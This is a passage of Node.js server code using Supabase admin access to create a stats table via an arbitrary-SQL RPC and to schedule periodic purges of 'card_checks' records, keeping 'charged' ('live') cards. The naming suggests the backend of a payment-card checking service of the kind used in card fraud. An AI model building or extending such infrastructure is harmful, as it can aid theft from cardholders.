              UNIQUE(user_id, status)
            );
          `;

          // Execute the SQL directly
          const { error: sqlError } = await supabaseAdmin.rpc('exec_sql', { sql: createTableSQL });

          if (sqlError) {
            console.error('Error creating card_stats table via SQL RPC:', JSON.stringify(sqlError, null, 2));

            // Try alternative method - create a temporary table first to verify permissions
            console.log('Trying alternative method to create table...');
            const { error: tempError } = await supabaseAdmin.rpc('exec_sql', {
              sql: 'CREATE TEMPORARY TABLE temp_test (id serial);'
            });

            if (tempError) {
              console.error('Cannot create temporary table, likely a permissions issue:', JSON.stringify(tempError, null, 2));
            } else {
              console.log('Successfully created temporary table, but still cannot create card_stats table');
            }
          } else {
            console.log('card_stats table created successfully via SQL RPC');
          }
        } catch (sqlExecError) {
          console.error('Exception during SQL execution:', sqlExecError);
        }
      }
    } else {
      console.log('card_stats table already exists');
    }
  } catch (error) {
    console.error('Error in ensureCardStatsTable:', error);
  }
}

// Function to completely clean 3DS card data
async function cleanup3DSCards() {
  try {
    console.log('Starting 3DS cards cleanup...');

    // Ensure the card_stats table exists
    await ensureCardStatsTable();

    // Get all 3DS cards
    const { data: threeDsCards, error: fetchError } = await supabaseAdmin
      .from('card_checks')
      .select('id, user_id, created_at')
      .eq('status', '3ds_challenge');

    if (fetchError) {
      console.error('Error fetching 3DS cards for cleanup:', fetchError);
      return;
    }

    console.log(`Found ${threeDsCards.length} 3DS cards to process`);

    if (threeDsCards.length === 0) {
      console.log('No 3DS cards to clean up');
      return;
    }

    // Group cards by user to maintain counts for statistics
    const userCardCounts = {};

    // Count cards by user
    threeDsCards.forEach(card => {
      if (!userCardCounts[card.user_id]) {
        userCardCounts[card.user_id] = {
          count: 0,
          ids: []
        };
      }

      userCardCounts[card.user_id].count++;
      userCardCounts[card.user_id].ids.push(card.id);
    });

    // For each user, create a single statistical record and delete all actual card data
    for (const [userId, data] of Object.entries(userCardCounts)) {
      if (data.ids.length === 0) continue;

      console.log(`Processing ${data.ids.length} 3DS cards for user ${userId}`);

      // Create a new statistical record
      const { error: insertError } = await supabaseAdmin
        .from('card_stats')
        .upsert([{
          user_id: userId,
          status: '3ds_challenge',
          count: data.count,
          last_updated: new Date().toISOString()
        }], { onConflict: 'user_id,status' });

      if (insertError) {
        console.error(`Error creating statistical record for user ${userId}:`, insertError);
        // Continue with deletion even if stats creation fails
      } else {
        console.log(`Created/updated statistical record for ${data.count} 3DS cards for user ${userId}`);
      }

      // Delete all 3DS cards for this user
      const { error: deleteError } = await supabaseAdmin
        .from('card_checks')
        .delete()
        .in('id', data.ids);

      if (deleteError) {
        console.error(`Error deleting 3DS cards for user ${userId}:`, deleteError);
      } else {
        console.log(`Successfully deleted all ${data.ids.length} 3DS cards for user ${userId}`);
      }
    }

    console.log('3DS cards cleanup completed - all 3DS card data has been completely removed');
  } catch (error) {
    console.error('Error in 3DS cards cleanup:', error);
  }
}

// Function to clean up old card check data
async function cleanupOldCardData() {
  try {
    console.log('Starting old card data cleanup...');

    // Calculate the date threshold (30 days ago)
    const thirtyDaysAgo = new Date();
    thirtyDaysAgo.setDate(thirtyDaysAgo.getDate() - 30);
    const dateThreshold = thirtyDaysAgo.toISOString();

    // Get count of old records
    const { count, error: countError } = await supabaseAdmin
      .from('card_checks')
      .select('id', { count: 'exact', head: true })
      .lt('created_at', dateThreshold)
      .not('status', 'eq', 'charged'); // Don't delete live cards

    if (countError) {
      console.error('Error counting old card data:', countError);
      return;
    }

    console.log(`Found ${count || 0} old card records to clean up`);

    if (!count || count === 0) {
      console.log('No old card data to clean up');
      return;
    }

    // Delete old records in batches to avoid timeouts
    const BATCH_SIZE = 1000;
    let deletedCount = 0;

    while (deletedCount < count) {
      // Get a batch of IDs to delete
      const { data: batchIds, error: batchError } = await supabaseAdmin
        .from('card_checks')
        .select('id')
        .lt('created_at', dateThreshold)
        .not('status', 'eq', 'charged')
        .limit(BATCH_SIZE);

      if (batchError) {
        console.error('Error fetching batch of old card data:', batchError);
        break;
      }

      if (!batchIds || batchIds.length === 0) {
        break;
      }

      // Extract just the IDs
      const ids = batchIds.map(record => record.id);

      // Delete the batch
      const { error: deleteError } = await supabaseAdmin
        .from('card_checks')
        .delete()
        .in('id', ids);

      if (deleteError) {
        console.error('Error deleting batch of old card data:', deleteError);
        break;
      }

      deletedCount += ids.length;
      console.log(`Deleted ${deletedCount} of ${count} old card records`);

      // Small delay to avoid overwhelming the database
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    console.log(`Old card data cleanup completed. Deleted ${deletedCount} records.`);
  } catch (error) {
    console.error('Error in old card data cleanup:', error);
  }
}

// Register tasks with the timer manager
timerManager
  .registerTask(
    '3ds-cleanup',
    cleanup3DSCards,
    3 * 60 * 60 * 1000, // 3 hours
    'Clean up 3DS card data while keeping counts'
  )
  .registerTask(
    'old-data-cleanup',
    cleanupOldCardData,
    24 * 60 * 60 * 1000, // 24 hours
    'Clean up old card check data (older than 30 days)'
  )
  .startAll(60 * 1000); // Start all tasks after 1 minute

// Database connection is verified when the server starts

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
